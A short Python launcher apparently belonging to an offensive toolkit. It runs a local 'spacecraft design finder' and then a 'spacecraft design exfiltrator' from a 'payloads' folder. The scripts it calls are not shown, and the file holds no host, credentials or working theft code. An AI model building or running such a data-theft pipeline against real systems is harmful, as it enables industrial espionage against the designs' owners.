import subprocess
import os

def main():
    # Run the spacecraft design finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "spacecraft_design_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the spacecraft design exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "spacecraft_design_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
